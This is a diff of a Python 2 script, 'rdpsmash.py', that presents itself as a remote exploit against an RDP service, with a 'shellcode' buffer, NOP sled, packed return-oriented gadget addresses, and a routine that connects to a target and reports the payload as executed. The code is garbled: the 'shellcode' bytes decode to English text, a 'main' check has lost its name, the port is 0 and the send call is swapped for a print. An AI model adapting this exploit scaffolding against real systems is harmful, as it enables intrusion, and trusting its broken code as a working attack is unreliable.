@@ -10,7 +10,9 @@ shellcode += "\x77\x69\x74\x68\x20\x73\x6f\x6d\x65\x74\x68\x69\x6e\x67\x20\x6d\x
 shellcode += "\x69\x6e\x73\x69\x64\x69\x6f\x75\x73"
 
 evil = trigger + nopsled
+
 # balls
+
             socket.inet_aton(str(address[1]))) #port bytes
         parsed =  struct.pack(">I", 0x8fe2fb63) #pop eax
         parsed += struct.pack(">I", 0x8fe2fb58) #push esp
@@ -30,13 +32,27 @@ evil = trigger + nopsled
         parsed += seeker[2] #add the packed port
         parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
         parsed += struct.pack(">I", 0x8fe2c71d) #mov eax,edx # ret
+
 # balls
+
+if  == "":
+    if len(sys.argv) != 2:
+        print "[*] Usage: python rdpsmash.py IP"
+        print "[*] If running on non-default port, reassign PORT in the source."
+
+    else:
+        TARGET = sys.argv[1]
+        PORT = 0 #nie ma porta
+
+        print "[*] Running rdpsmash"
+        print
+        s = RDPsocket(evil, shellcode)
         print "[+] Connecting and configuring payload. . ."
         print "[+] This may take some time"
         s.connect((TARGET, PORT))
         print "[+] Connection established"
         print "[+] Sending payload. . ."
-        s.evil_sendall()
+        print "[+] This may take some time"
         response = s.recv(4096)
         if "\xA5\x43\xE7\x38\x75\x84\xF2\xFF\xFF\x18\x61\x00" in response:
             print "[+] Success! Payload sent and executed."
